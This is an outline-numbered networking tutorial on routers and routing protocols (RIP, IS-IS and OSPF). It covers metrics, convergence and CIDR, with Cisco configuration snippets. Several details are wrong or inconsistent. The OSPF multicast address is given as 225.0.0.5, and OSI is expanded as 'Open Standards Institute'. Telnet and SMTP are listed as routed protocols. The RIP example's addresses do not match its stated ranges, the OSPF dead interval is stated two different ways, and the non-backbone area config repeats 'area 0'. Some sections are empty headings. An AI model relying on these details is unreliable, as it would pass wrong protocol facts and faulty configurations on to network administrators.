A router is specialized computer connected to more than one network running software that allows the router to move data from one network to another. Routers operate at the network layer (OSI Model's layer 3). The primary function of a router is to connect networks together and keep certain kinds of broadcast traffic under control. There are several companies that make routers: Cisco (Linksys), Juniper, Nortel (Bay Networks), Redback, Lucent, 3Com, and HP just to name a few.
Why do I need a Router?

Routers used in networks perform the following functions:

    Restrict broadcasts to the LAN
    Act as the default gateway.
    Move (route) data between networks
    Learn and advertise loop free paths

Restrict Broadcasts to the LAN

Networks (especially Ethernet networks) use broadcast communication at the physical, datalink and network layer. Network layer broadcasts are transmissions sent to all hosts using the network layer protocol (usually Internet Protocol [IP] or IPX). Network broadcast communication is used to communicate certain kinds of information that makes the network function (ARP, RARP, DHCP, IPX-SAP broadcasts etc.). Since several devices could attempt to transmit simultaneously and cause collisions, it is preferable to separate large sets of hosts into different broadcast domains using a switch, or router.

As the number of hosts on the network increases, the amount of broadcast traffic increases. If enough broadcast traffic is present on the network, then ordinary communication across the network becomes difficult.

To reduce broadcasts, a network administrator can break up a network with a large number of hosts into two smaller networks. Broadcasts are then restricted to each network, and the router performs as the 'default gateway' to reach the hosts on the other networks.
Act as the Default Gateway

Especially in today's networks, people are connecting to the Internet. When your computer wants to talk to a computer on another network, it does so by sending your data to the default gateway (your local router). The router receives your data, looks for the remote address of that far-off computer makes a routing decision and forwards your data out a different interface that is closer to that remote computer. There could be several routers between you and the remote computer, so several routers will take part in handing off the packet, much like a fireman's bucket brigade.
Move (route) Data between Networks

Routers have the capability to move data from one network to another. This allows two networks managed by different organizations to exchange data. They create a network between them and exchange data between the routers on that network. Because a router can accept traffic from any kind of network it is attached to, and forward it to any other network, it can also allow networks that could not normally communicate with each other to exchange data. In technical terms, a token ring network and an ethernet network can communicate over a serial network. Routers make all this possible.

A router can take in an Ethernet frame, strip the ethernet data off, and then drop the IP data into a frame of another type such as SDH/SONET, PDH/T1, ATM, FDDI. In this way a router can also perform 'protocol conversion', provided it has the appropriate hardware and software to support such a function. The whole point, however, is to forward the data from the interface it receives data on, to another interface that retransmits the received data onto another interface serving another network.
Learn and Advertise Loop-Free Paths
Routers can only learn and advertise routes dynamically if they are using a routing protocol such as RIP, OSPF, EIGRP, IS-IS or BGP.   Otherwise, a human has to configure the routes by hand, which is called static routing.

Routing moves data on a hop-by-hop basis, what is often called 'hot potato' routing.  If a set of routers ends up passing the data around in a circle, without reaching the destination, it's calleda a 'routing loop'.  Packets get tossed around the loop until they die of old age:  their 'Time To Live' counter in the IP datagram is decremented as it passes through each router and eventually it reaches zero and is discarded. 

       						12.1.1.1.4.1.3  Routing Protocol
    A routing protocol is a standardized process by which routers learn and communicate connectivity information, called routes, each of which which describes how to reach a destination host and network. Routers that wish to exchange routing information must use the same routing protocol to communicate routing information. 

Routing is the process of learning all the paths through the network (routes) and using routes to forward data from one network to another. A protocol is a standardized way to perform a task. So, a routing protocol would be a standardized way of learning routes and moving data from one network to another.

Routing protocols are used by routers to dynamically learn all paths through a set of networks and forward data between the networks. Routers are specialized computer devices designed to perform routing.
Examples of Routing Protocols

    EIGRP
    OSPF
    RIP, RIP II
    IS-IS
    BGP

  
       						12.1.1.1.4.1.4  Routing vs. Routed
ROUTING PROTOCOLS are the software that allow routers to dynamically advertise and learn routes, determine which routes are available and which are the most efficient routes to a destination. Routing protocols used by the Internet Protocol suite include:

    Routing Information Protocol (RIP and RIP II)
    Open Shortest Path First (OSPF)
    Intermediate System to Intermediate System (IS-IS)
    Interior Gateway Routing Protocol (IGRP)
    Cisco's Enhanced Interior Gateway Routing Protocol (EIGRP)
    Border Gateway Protocol (BGP)

Routing is the process of moving data from one network to another network. Within a network, all hosts are directly accessable and do not need to pass data through a default gateway. All hosts on the same network are directly connected and can communicate directly with each other.
ROUTED PROTOCOLS

ROUTED PROTOCOLS are nothing more than data being transported across the networks. Routed protocols include:

    Internet Protocol
        Telnet
        Remote Procedure Call (RPC)
        SNMP
        SMTP
    Novell IPX
    Open Standards Institute networking protocol
    DECnet
    Appletalk
    Banyan Vines
    Xerox Network System (XNS)

Outside a network, specialized devices called ROUTERS are used to perform the routing process of forwarding packets between networks. Routers are connected to the edges of two or more networks to provide connectivity between them. These devices are usually dedicated machines with specialized hardware and software to speed up the routing process. These devices send and receive routing information to each other about networks that they can and cannot reach. Routers examine all routes to a destination, determine which routes have the best metric, and insert one or more routes into the IP routing table on the router. By maintaining a current list of known routes, routers can quicky and efficiently send your information on it's way when received.


There are many companies that produce routers: Cisco, Juniper, Bay, Nortel, 3Com, Cabletron, etc. Each company's product is different in how it is configured, but most will interoperate so long as they share common physical and data link layer protocols (Cisco HDLC or PPP over serial, Ethernet etc.). Before purchasing a router for your business, always check with your Internet provider to see what equipment they use, and choose a router which will interoperate with your Internet provider's equipment.
NON-ROUTABLE PROTOCOLS
NON-ROUTABLE PROTOCOLS cannot survive being routed. Non-routable protocols presume that all computers they will ever communicate with are on the same network (to get them working in a routed environment, you must bridge the networks). Todays modern networks are not very tolerant of protocols that do not understand the concept of a multi-segment network and most of these protocols are dying or falling out of use.

    NetBEUI
    DLC
    LAT
    DRP
    MOP

       						12.1.1.1.4.1.5  Metrics
There are several basic concepts that surround the routing process and the concept of a route:

    What is routing?
    What is a router?
    What is convergence?
    What are advertisements?
    What are metrics?

What is routing?

Routing is the process of moving data from one network to another and is usually performed at the network layer in the OSI model. The routing function is performed by Internet Protocol on networks running TCP/IP.
What is a router?

Any computer with more than one network interface and which has hardware or software that performs routing is called a router. The primary reason for putting a router in a network is to reduce the ammount of broadcast traffic by splitting the network into at least two parts.
What is Convergence?

Dynamic routing protocols calculate routes by advertising the networks they are connected to and the routes they use to reach other routers connected to more networks. Once all the routers in a network know all routes to all destinations, the routing protocol has said to have 'converged'. If a user were to attempt to reach a destination before the routing protocol converged, the data might never get to its destination. There are two problems that occur when a network is having difficulty reaching the state of convergence: routing loops and black holes.
Routing Loops

If a packet reaches a router which does not know how to get to the destination and get dropped, or the packet might get forwarded through a circle of routers in what is called a 'routing loop'. If that happened, the packet would simply run around in circles till it grew old and died. Fortunately, most data is given a time to live. When data is forwarded from one router to the next, one more tick is taken off it's time to live. Eventually that time to live reaches zero and the data is thrown away. This prevents the network from becoming congested.
Black Holes

Black holes are what happens when a route sends data to the wrong place or can't get to the destination. The data is simply dropped and vanishes from the network. Packets go in and they don't come out. Nearly all 'black holes' are unintentional and are caused by problems occurring on the network. However, Internet providers will sometimes intentionally black hole destinations belonging to those who abuse their Internet privledges. SPAMMERS beware!
Why don't networks converge?

When an interface on a router is rendered inoperable for any reason (the interface breaks or burns out, the connector gets bent, the cable breaks etc.), the routes pointing data to that interface are withdrawn from that router's announcements to other routers; thus, convergence can be a difficult thing to achieve on a network with very low reliability.
What are Advertisements?

Advertisements are messages sent between routers that pass on information about how to reach destinations. Some routing protocols advertise the complete list of known routes, some protocols only advertise summarized lists of routes, or changes.
What are Metrics?

Routing metrics are a scoring system for routes used to indicate how good or bad the route is. Metrics are calculated by routers to prioritize routes from best to worst. Routers use the metrics to select the best possible route or routes to a given destination. Metrics can include hop count (how many stops there are between here and the destination), media type (serial, FDDI, Token Ring, ethernet, SONET etc.), availability (whether the machine is up or down) and several other factors including some set by the Network Administrator. A lower metric generally indicates a better route.

       						12.1.1.1.4.1.6  Convergence
       						12.1.1.1.4.1.7  Static vs. Dynamic
       						12.1.1.1.4.1.8  Single vs. Multipath
Single Path protocols learn routes and select a single best route to each destination. These protocols are incapable of load balancing traffic. An example of a single-path protocol is standard Border Gateway Protocol (BGP). BGP will advertise only the single best path it knows to a destination. It will only insert a single path to a destination in the IP routing table. However, today there is eBGP Multipath, which allows BGP to perform load balancing by creating equal cost paths.

Multi-path protocols learn routes and can select more than one path to a destination. These protocols are better for performing load balancing. OSPF, RIP and several other protocols will learn several best paths and will route traffic accordingly, dividing up the bandwidth based on the protocol's metrics, or on the administrator's configuration.
       						12.1.1.1.4.1.9  Interior vs. Exterior Gateway Protocols
Routing is the process of moving data from one network to another. Routing is unnecessary unless you have multiple networks	on different address ranges different combinations of IP addresses and subnet masks, for example). If you don't, you need to look at bridging or switching. You don't need to run a routing protocol unless you have multiple networks served by more than one router (and even then, manual static routes are easier for small networks). Once you get beyond three routers, it's time to start thinking about dynamic routing protocols. If you are connecting your networks to the Internet, you will also need to think about running more than one kind of routing protocol.

INTERIOR GATEWAY PROTOCOLS

Interior Gateway Protocols (IGPs) handle routing within an Autonomous System (one routing domain). In plain English, IGP's figure out how to get from place to place between the routers you own. These dynamic routing protocols	keep track of paths used to move data from one end system to another inside a network or set of networks that you administrate (all of the networks you manage combined are usually just one Autonomous System). IGP's are how you get all the networks communicating with each other.

IGP's fall into two categories:

  Distance Vector Protocols
     Routing Information Protocol (RIP)
     Interior Gateway Routing Protocol (IGRP)

  Link State Protocols
     Open Shortest Path First (OSPF)
     Intermediate System to Intermediate System (IS-IS)
 

EXTERIOR GATEWAY PROTOCOLS

To get from place to place outside your network(s), i.e. on the Internet, you must use an Exterior Gateway Protocol. Exterior Gateway Protocols handle routing outside an Autonomous System and get you from your network, through your Internet provider's network and onto any other network. BGP is used by companies with more than one Internet provider to allow them to have redundancy and load balancing of their data transported to and from the Internet.

Examples of an EGP:
    Border Gateway Protocol (BGP)
    Exterior Gateway Protocol (Replaced by BGP)
       						12.1.1.1.4.1.10 Flat vs. Hierarchichal
FLAT

Flat routing protocols distribute information as needed to any router that can be reached or receive information. No effort is made to organize the network or its traffic, only to discover the best route hop by hop to a destination by any path. Think of this as all routers sitting on a flat geometric plane. Routing Information Protocol (RIP) is an example of a flat routing protocol.
HIERARCHICAL

Heirarchical routing protocols often group routers together by function into a hierarchy. A heirarchical protocol allows an administrator to make best use of his fast powerful routers as backbone routers, and the slower, lower powered routers may be used for access purposes. In this way, the access routers form the first tier of the hierarchy, and the backbone routers form the second tier. Hierarchichal protocols make an effort to keep local traffic local, that is, they will not forward traffic to the backbone if it is not necessary to reach a destination. Some hierearchichal protocols also perform route aggregation to reduce the number of routes advertised (only summary routes are advertised).

Connections and data flow through the access routers, and only enter the backbone when trying to reach distant parts of the network that have no local connections other than the backbone routers. This allows traffic to flow freely locally, and concentrates long distance data onto the backbone links to flow efficiently to the opposite side minimizing congestion.

Open Shortest Path First (OSPF) and Intermediate-system to Intermediate-System (IS-IS) are two routing protocols that can be configured to organize a network hierarchically.
       						12.1.1.1.4.1.11 Distance Vector vs. Link State Protocols
Overview

"Distance Vector" and "Link State" are terms used to describe routing protocols which are used by routers to forward packets between networks. The purpose of any routing protocol is to dynamically communicate information about all network paths used to reach a destination and to select the from those paths, the best path to reach a destination network. The terms distance vector and link state are used to group routing protocols into two broad categories based on whether the routing protocol selects the best routing path based on a distance metric (the distance) and an interface (the vector), or selects the best routing path by calculating the state of each link in a path and finding the path that has the lowest total metric to reach the destination.
DISTANCE VECTOR

Distance
    Distance is the cost of reaching a destination, usually based on the number of hosts the path passes through, or the total of all the administrative metrics assigned to the links in the path.
Vector
    From the standpoint of routing protocols, the vector is the interface traffic will be forwarded out in order to reach an given destination network along a route or path selected by the routing protocol as the best path to the destination network. 

Distance vector protocols use a distance calculation plus an outgoing network interface (a vector) to choose the best path to a destination network. The network protocol (IPX, SPX, IP, Appletalk, DECnet etc.) will forward data using the best paths selected.
Common distance vector routing protocols include:

    Appletalk RTMP
    IPX RIP
    IP RIP
    IGRP

Advantages of Distance Vector Protocols

Well Supported
    Protocols such as RIP have been around a long time and most, if not all devices that perform routing will understand RIP. 
 

LINK STATE  

Link State protocols track the status and connection type of each link and produces a calculated metric based on these and other factors, including some set by the network administrator. Link state protocols know whether a link is up or down and how fast it is and calculates a cost to 'get there'. Since routers run routing protocols to figure out how to get to a destination, you can think of the 'link states' as being the status of the interfaces on the router. Link State protocols will take a path which has more hops, but that uses a faster medium over a path using a slower medium with fewer hops.

Because of their awareness of media types and other factors, link state protocols require more processing power (more circuit logic in the case of ASICs) and memory. Distance vector algorithms being simpler require simpler hardware.
 
A Comparison: Link State vs. Distance Vector

See Fig. 1-1 below. If all routers were running a Distance Vector protocol, the path or 'route' chosen would be from A  B directly over the ISDN serial link, even though that link is about 10 times slower than the indirect route from A  C  D  B.

A Link State protocol would choose the A  C  D  B path because it's using a faster medium (100 Mb ethernet). In this example, it would be better to run a Link State routing protocol, but if all the links in the network are the same speed, then a Distance Vector protocol is better.


       						12.1.1.1.4.1.12 Source Routing
Source routing originates from the days when routers did not exist and hosts had to know how to reach the destination computers they were communicating with. This was most common in networks utilizing mainframes.

Source routing is handled by the end station (a computer, workstation or mainframe). Each end station keeps track of the paths to all destinations it needs to reach. All routing intelligence is in the transmitting host. Source routing protocols generally do a better job of picking the best path, however source routing protocols usually require a lot of traffic transmission to discover these paths. Often the end station hardware needs to be a bit more sophisticated (better CPU and more RAM) to be able to process this routing information and choose optimal paths to a destination.
       						12.1.1.1.4.1.13 Default Gateways
A default gateway is the router to which your computer addresses packet information for data destined for a computer on another network.

If you have a set of computers that can talk to each other directly, you have a network. For computers on your network to talk to computers on another network, you need a default gateway. The default gateway is a computer to which other local computers send data that is destined for a non-local computer. On computers running IP, a default gateway address is needed to reach all computers that are not on the same local IP subnet. Traditionally, the network administrator configures a computer with routing capability with first address in a range of IP addresses as the default gateway and points all clients at it.

When computers attempt to communicate with other computers that are not local to the IP address range they belong to (the subnet they belong to), the local computers must send their data to the default gateway to be forwarded. This occurs as follows:

    Is the remote computer's IP address on the same subnet?
    YES. Use ARP to get the remote computer's physical address (MAC address).
    NO. Use ARP to get the default gateway's physical address (MAC address).
    Construct a physical frame containing:
        The physical frame will be addressed to the physical address gathered in either step 2 or 3.
        The payload of the physical/data link layer frame will contain the IP header which will contain the remote computer's IP address.
    Transmit the frame
    If the frame is addressed to the default gateway, the gateway will receive the packet, find a route that matches the remote computer's IP address.

       						12.1.1.1.4.1.14 Classless Inter Domain Routing (CIDR)
For years, the Internet has been growing at an alarming pace. The proliferation of the 'dot com' and e-commerce companies caused a huge surge in the use of Internet Protocol (IP) addresses, and an increase in the number of destinations on the Internet. Each destination has a range of IP addresses associated with it (a 'block of IP's' in NetSpeak).

Routers use routing protocols such as BGP exchange information about how to reach these destinations. As the number of destinations grew, so did the number of routes (paths) to reach these networks. Soon, it became clear that the routers couldn't store the growing number of routes, they also couldn't handle the optimum path calclulations much longer, and the IP address space was being handed out far too quickly because it was carved into large classful blocks.

CIDR: SUBNETTING, SUPERNETTING AND ROUTE AGGREGATION

The soluton to the depletion of IP addresses and the proliferation of the number of routes was two fold. ARIN used a three-pronged solution to this problem.

To reduce the number of routes in the Internet backbone, supernetting was used to aggregate destinations together into larger blocks of IP's. Larger blocks of IP's would only be allocated to the ISP's. The ISP's were, in turn, expected to aggregate their routes so that routing protocols could make fewer announcements of larger blocks. Of course, this created other problems for customers who were wise enough to not count on a single ISP for their Internet access...

ROUTE AGGREGATION

ARIN recommended that all backbone Internet providers combine or 'aggregate' their routes to reduce the total number of routes being advertised. ARIN further recommended that all companies and organizations wishing to connect to the Internet request IP addresses from their Internet provider instead of ARIN.

If a company gets a small block of IP addresses from the larger block of IP addresses owned by their upstream provider, their provider can more easilly aggregate those routes because the customer's IP addresses originally came from the larger block of IP addresses owned by the Internet provider.
       						12.1.1.1.4.1.15 CIDR Notation
BGP uses Classless Inter-Domain Routing (CIDR) notation for masks. When advertising routes, BGP will include prefixes in it's advertisements. A prefix is the network IP address plus the mask in CIDR notation.

Below are tables showing how IP masks and CIDR masks are related. In every IP address, certain bits are used to identify the network, and certain bits are used for host. The mask allows the receiver to tell which bits are network, and which are host. Ones are used to mark the Network bits, and zeroes are used to mark the Host bits.
  	CLASS 'A' NETWORKS
BINARY 	11111111.00000000.00000000.00000000
DECIMAL 	255.0.0.0
CIDR 	/8

 
  	CLASS 'B' NETWORKS
BINARY 	11111111.11111111.00000000.00000000
DECIMAL 	255.255.0.0
CIDR 	/16

 
  	CLASS 'C' NETWORKS
BINARY 	11111111.11111111.11111111.00000000
DECIMAL 	255.255.255.0
CIDR 	/24

You will note that the number in the CIDR mask notation is equal to the number of 1's in the binary mask. The same holds true for subnets:
  	1/2 CLASS 'C' NETWORK
BINARY 	11111111.11111111.11111111.10000000
DECIMAL 	255.255.255.128
CIDR 	/25

And for supernets as well:
  	2 CLASS 'C' NETWORKS
BINARY 	11111111.11111111.11111110.00000000
DECIMAL 	255.255.254.0
CIDR 	/23

So for CIDR notation, the number after the slash is equal to the number of network bits (1's) in theymask.

					12.1.1.1.4.2 THE ROUTING PROTOCOLS

						12.1.1.1.4.2.1 Routing Information Protocol (RIP)
RIP is a dynamic, distance vector routing protocol based around the Berkely BSD application routed and was developed for smaller IP based networks. RIP uses UDP port 520 for route updates. RIP calculates the best route based on hop count. Like all distance vector routing protocols, RIP takes some time to converge. While RIP requires less CPU power and RAM than some other routing protocols, RIP does have some limitations:

Metric: Hop Count
    Since RIP calculates the best route to a destination based solely on how many hops it is to the destination network, RIP tends to be inefficient in network using more than one LAN protocol, such as Fast Ethernet and serial or Token Ring. This is because RIP prefers paths with the shortest hop count. The path with the shortest hop count might be over the slowest link in the network. 
 
Hop Count Limit
    RIP cannot handle more than 15 hops. Anything more than 15 hops away is considered unreachable by RIP. This fact is used by RIP to prevent routing loops.
Classful Routing Only
    RIP is a classful routing protocol. RIP cannot handle classless routing. RIP v1 advertises all networks it knows as classful networks, so it is impossible to subnet a network properly via VLSM if you are running RIP v1, which

However, it must be pointed out that RIP is the only routing protocol that all routing devices and software support, so in a mixed equipment environment, RIP may be your only option for dynamic routing. This is changing with the widespread use of OSPF.
RIP MESSAGES

RIP updates are placed as UDP payload inside an IP datagram. Below is the base format of a RIP message.
command 	version 	zeroes
Address Family ID 	zeroes
IP Address
zeroes
zeroes
Metric

Payload...

 

COMMAND types (field value)

    REQUEST (1)- Request either a partial or full table update from another RIP router.
    RESPONSE (2) - A response to a request. All route updates use this command in the command field.
    TRACEON (3) / TRACEOFF (4) - Obsolete and ignored.
    RESERVED (5) - Sun Microsystems uses this field for it's own purposes.

VERSION field - Describes which version of the RIP protocol it is (1 or 2).

ADDRESS FAMILY ID - Identifies which addressing protocol is being used (CLNS, IPX, IP etc.)

METRIC - Metric measures how 'good' a route is. RIP uses the number of hops as the metric. The route with the fewest number of hops is preferred.
RIP ROUTING UPDATES

Routers running IP RIP broadcast the full list of all the routes they know every 30 seconds. When a router running RIP hears a broadcast it runs the distance vector algorithm to create a list of best routes.
RIP TIMERS

TIMER 	DEFAULT 	CONTROLS
Update 	30 sec. 	Interval between route update advertisements
Hold-Down 	90 sec. 	Period a route is withdrawn from the table to prevent a routing loop.
Timeout 	180 sec. 	Interval a route should stay 'live' in the routing table. This counter is reset every time the router hears an update for this route.
Flush 	120 sec. 	How long to wait to delete a route after it has timed out.

The routing-update timer controls the time between routing updates. Default is usually 30 seconds, plus a small random delay to prevent all RIP routers from sending updates simultaneously.

The route-timeout timer controls when a route is no longer available. The default is usually 180 seconds. If a router has not seen the route in an update during this specified interval, it is dropped from the router's announcements. The route is maintained long enough for the router to advertise the route as down (hop count of 16).

The route-flush timer controls how long before a route is completely flushed from the routing table. The default setting is usually 120 seconds.
CISCO ROUTERS - Configuring RIP

Configuring a Cisco router for RIP requires a series of configuration steps. First you must turn on the RIP routing protocol, then you must identify the network that will be advertised and which interfaces will advertise it with the network statement.
BASIC RIP CONFIGURATION (Cisco)

According to the recollection of InetDaemon, configuring a Cisco router for a basic RIP configuration would look something like this:

  router> enable
  Password:
  router# conf t
  router(config)#interface ethernet 0
  router(config-if)# ip address 192.168.42.1
  router(config-if)# interface ethernet 1
  router(config-if)# ip address 192.168.43.1
  router(config-if)# exit
  router(config)# router rip
  router(config-router)# network 192.168.42.0
  router(config-router)# network 192.168.43.0
  router(config-router)# exit
  router(config-router)# ^z
  router# 

The example above assumes that the interfaces that will be running RIP have IP addresses on them that fall within the 204.191.42.0, and 204.191.43.0 class C ranges.
						12.1.1.1.4.2.2 Intermediate System to Intermediate System (IS-IS)
IS-IS (pronounced eye-ess-eye-ess) is defined in ISO 10589. IS-IS is the descendant of the older OSI CLNS routing protocol. IS-IS is a dynamic , link state routing protocol. In an IS-IS network, there are End Systems, Intermediate Systems, Areas and Domains. End systems are user devices. Intermediate systems are routers. Routers are organized into local groups called 'areas' and several areas are grouped together into a 'domain'. IS-IS places Area routers into Layer 1, and routers that interconnect the Areas into Layer 2. IS-IS uses it's own addressing scheme.

There are two types of IS-IS addresses:

    Network Service Access Point (NSAP)
    NSAP addresses identify network layer services, one for each service running. (NSAP's are broken down as follows)
        Initial Domain Part (IDP)
            Authority and Format Identifier (AFI) (1-byte)
            Provides information about the structure and content of the IDI and DSP fields.
            Initial Domain Identifier (IDI) (variable length)
        Domain Specific Part (DSP)
            High Order Domain Specific Part
            Area ID
            System ID
            n-selector
            (1-byte value that serves a function similar to the port number in Internet Protocol).
    Network Entity Title (NET)
    NET addresses identifynetwork layer entities or processes instead of services.

Devices may have more than one of each of the two types of addresses. However NET's should be unique, and the System ID portion of the NSAP must be unique for each system. 
						12.1.1.1.4.2.3 Open Shortest Path First (OSPF)

    Open Shortest Path First - OSPF Introduction
    Open Shortest Path First - OSPF Router Types
        Designated Router
        Backup Designated Router
        Internal router
        Backbone router
        Area Border Router
        Autonomous System Boundary Router
    Open Shortest Path First - OSPF Areas
        Backbone
        Not So Stubby
        Stubby
        Totally Stubby
        Virtual Links
    Open Shortest Path First - OSPF Operation
        Neighbor Discovery
        Forming Adjacencies
        Link State Advertisements (LSAs)
            Types (by type code)
                1 - Router LSA
                2 - Network LSA
                3 - Network summary LSA
                4 - ASBR Summary LSA
                5 - AS External LSA
                6 - Group Membership LSA
                7 - NSSA External LSA
                8 - External Attributes LSA
                9 - Opaque LSA (link-local scope)
                10 - Opaque LSA (area-local scope)
                11 - Opaque LSA (AS scope)
            Flooding
            Reliable Transport
        Shortest Path First Calculations
    Open Shortest Path First - OSPF Configuration
    Open Shortest Path First - OSPF Troubleshooting

Introduction to Open Shortest Path First (OSPF) - A Tutorial

Open Shortest Path First (OSPF) is a link state routing protocol which was first defined as version 2 in RFC 2328. It is used to allow routers to dynamically learn routes from other routers and to advertise routes to other routers. Advertisements containing routes are referred to as Link State Advertisements (LSAs) in OSPF. OSPF router keeps track of the state of all the various network connections (links) between itself and a network it is trying to send data to. This makes it a link-state routing protocol. OSPF supports the use of classless IP address ranges and is very efficient. OSPF uses areas to organize a network into a hierarchal structure; it summarizes route information to reduce the number of advertised routes and thereby reduce network load and uses a designated router (elected via a process that is part of OSPF) to reduce the quantity and frequency of Link State Advertisements. OSPF does require the router have a more powerful processor and more memory than other routing protocols.

OSPF selects the best routes by finding the lowest cost paths to a destination. All router interfaces (links) are given a cost. The cost of a route is equal to the sum of all the costs configured on all the outbound links between the router and the destination network, plus the cost configured on the inteface that OSPF received the Link State Advertisement on.

This tutorial will focus on explaining the basic components of OSPF, the operation of OSPF, basic configuration of OSPF and finally close with troubleshooting techniques used to verify correct OSPF configuration and operation.
OSPF Router Types

    Internal Router
    Backbone Router
    Area Border Router (ABR)
    Autonomous System Boundary Router (ASBR)
    Designated Router (DR)
    Backup Designated Router (BDR)

In this part of our OSPF tutorial, when speaking of an OSPF router, we are speaking of the OSPF routing process running on a given routing device. OSPF routers serve in various roles depending upon where they are located and which areas they participate in.

Internal Routers
    An internal router connects only to one OSPF area. All of its interfaces connect to the area in which it is located and does not connect to any other area. 

If a router connects to more than one area, it will be one of the following types of routers.

Backbone Routers
    Backbone routers have one or more interfaces in Area 0 (the backbone area). 
Area Border Router (ABR)
    A router that connects more than one area is called an area border router or ABR. Usually an ABR is used to connect non-backbone areas to the backbone. If OSPF virtual links are used an ABR will also be used to connect the area using the virtual link to another non-backbone area. 
Autonomous System Boundary Router (ASBR)
    If the router connects the OSPF Autonomous System to another Autonomous System, it is called an Autonomous System Boundary Router (ASBR). 

OSPF elects two or more routers to manage the Link State Advertisments:

Designated Router (DR)
    Every OSPF area will have a designated router and a backup designated router. The Designated Router (DR) is the router to which all other routers within an area send their Link State Advertisements. The Designated Router will keep track of all link state updates and make sure the LSAs are flooded to the rest of the network using Reliable Multicast transport. 
Backup Designated Router (BDR)
    The election process which determines the Designated Router will also elect a Backup Designated Router (BDR). The BDR takes over from the DR when the DR fails.

OSPF Areas

OSPF areas are used to impose a hierarchial structure to the flow of data over the network. A network using OSPF will always have at least one area and if there is more than one area, one of the two areas must be the backbone area. OSPF has only 2 levels to its hierarchy, the backbone, and all other areas attached to it. Areas are used to group routers into manageable groups that exchange routing information locally, but summarize that routing information when advertising the routes externally. A standard OSPF network looks something like a big bubble (the backbone area) with a lot of smaller bubbles (stub areas) attached directly to it. Area Border Routers (ABR) are used to connect the areas. Each area will elect a designated router (DR) and a backup designated router (BDR) to assist in flooding Link State Advertisements (LSAs)throughout the area.
Backbone (Area 0)

The backbone is the first area you should always build in any network using OSPF and the backbone is always Area 0 (zero). All areas are connected directly to the OSPF backbone area. When designing an OSPF backbone area, you should make sure there is little or no possibility of the backbone area being split into two or more parts by a router or link failure. If the OSPF backbone is split due to hardware failures or access lists, sizeable areas of the network will become unreachable.
Totally Stub Area

A totally stubby area is only connected to the backbone area. A totally stubby / totally stub area does not advertise the routes it knows. It does not send any Link State Advertisements. The only route a totally stub area receives is the default route from an external area, which must be the backbone area. This default route allows the totally stub area to communicate with the rest of the network.
Stub Area

Stub areas are connected only to the backbone area. Stub areas do not receive routes from outside the autonomous system, but do receive the routes from within the autonomous system, even if the route comes from another area.
Not-So-Stubby (NSSA)

Frequently, it is advisable to use a separate network to connect the internal enterprise network to the Internet. OSPF makes provisions for placing an Autonomous System Boundary Router (ASBR) within a non-backbone area. In this case, the stub area must learn routes from outside the OSPF autonomous system. Thus, a new type of LSA was required--the Type 7 LSA. Type 7 LSA's are created by the Autonomous System Boundary Router and forwarded via the stub area's border router (ABR) to the backbone. This allows the other areas to learn routes that are external to the OSPF routing domain.
Virtual Links

Virtual links are used when you have a network that must be connected to an existing OSPF system, but cannot be physically connected directly to the routers in the OSPF backbone area. You can configure an OSPF virtual link from the area to a backbone router, creating a virtual direct connection to the backbone area. This virtual link acts as a tunnel which forwards LSAs to the backbone via a second intermediate area.
OSPF Operation

    OSPF Router ID
    Designated Router Election
    OSPF Link States
    OSPF Timers
    Neighbor Discovery
    Forming Neighbor Adjacencies
    Link State Advertisements
    Route Summarization
    Shortest Path Algorithm

OSPF Router ID
The OSPF Router ID identifies a specific router in the OSPF topology. The Router ID is either a) the IP address assigned to the loopback interface, or b) the IP address of the interface with the highest IP address number.  Using the loopback interface makes a more stable OSPF environment as the loopback interface is always up, unlike physical interfaces, which can fail. If a physical interface fails, the OSPF router ID may change, triggering router election and link state advertisement flooding.

Designated Router Election
Once the designated router has been chosen, it remains the designated router until it fails.

OSPF Link States
OSPF Timers
There are several OSPF timers in operation:

    HELLO timer - 10 seconds by default
    DEAD timer - Usually 4x the HELLO timer (40 seconds by default)
    Link State Database Updates - Whenever the OSPF route table changes, or 30 minutes from the last change, whichever occurs first.


Neighbor Discovery
An OSPF neighbor is any other adjacent router that is connected to the router (physically, or logically over a tunnel) and which runs OSPF and which the router is intended to exchange routing information. When OSPF is enabled, HELLO messages (type 89 in the IP header) are addressed to the IP address 225.0.0.5, the IANA-assigned OSPF multicast address, and flooded out all interfaces participating in OSPF every 10 seconds. Any neighboring router that hears these HELLO messages will learn:

    The neighbor's Router ID (RID)
    The Area ID the neighbor participates in
    The HELLO interval (default is 10 seconds)
    The DEAD interval (usually 5 failed HELLOs)
    The Router ID (RID) of the Designated Router (if known)
    The Router ID (RID) of the Backup Designated Router (if known)
    The Router ID of all known routers

Forming Neighbor Adjacencies
Once a router sees its own ID in a neighbor's HELLO, it assumes two-way communication has been accomplished and the router begins sending link state advertisements (LSAs).  This will only occur if the following items are configured identically on the two routers:

    The HELLO interval
    The DEAD interval
    Authentication checks
    The OSPF area ID
    The stub area flag value


OSPF Route Types

    Intra-area (O)
    Interarea (IA)
    External Type 1 (E1)
    External Type 2 (E2)

Link State Advertisement Types

    LSA Type 1 - Router LSA
    LSA Type 2 - Network LSA
    LSA Type 3 - Network summary LSA
    LSA Type 4 - ASBR Summary LSA
    LSA Type 5 - AS External LSA
    LSA Type 6 - Group Membership LSA
    LSA Type 7 - NSSA External LSA
    LSA Type 8 - External Attributes LSA
    LSA Type 9 - Opaque LSA (link-local scope)
    LSA Type 10 - Opaque LSA (area-local scope)
    LSA Type 11 - Opaque LSA (AS scope)

LSA Flooding
Reliable Multicast Transport
Route Summarization
Shortest Path First Algorithm
Open Shortest Path First - OSPF Configuration
Configure OSPF on Cisco
Enter Configuration mode:

host-a# conf t

Configure the loopback addresses on all routers. The loopback address will become the OSPF Router ID:

host-a(config)# int loopback 0
host-a(config-if)# ip address <ip-address> <subnet-mask>

Configure OSPF backbone area first on the routers in the core of the network:

host-a(config)# router ospf <pid>
host-a(config-router)# network <network> <wildcard mask> area 0

Configure other routers in the remaining OSPF areas:

host-a(config)# router ospf <pid>
host-a(config-router)# network <network> <wildcard mask> area 0

Configure OSPF on Juniper
Open Shortest Path First - OSPF Troubleshooting
Failure to Become Neighbors
If two routers won't become neighbors, check the following:

    Check the physical layer connectivity
    Check any logical connectivity if it is used (such as tunnels)
    The two routers share a common network subnet
    The two routers have the same subnetwork address
    The IP address mask is the same
    The neighbor's Router ID (RID)
    The Area ID the neighbor participates in
    The HELLO interval (default is 10 seconds)
    The DEAD interval (usually 5 failed HELLOs)
    The Router ID (RID) of the Designated Router (if known)
    The Router ID (RID) of the Backup Designated Router (if known)
    The Router ID of all known routers
						12.1.1.1.4.2.4 Interior Gateway Routing Protocol (IGRP)

						12.1.1.1.4.2.5 Enhanced Interior Gateway Routing Protocol (EIGRP)

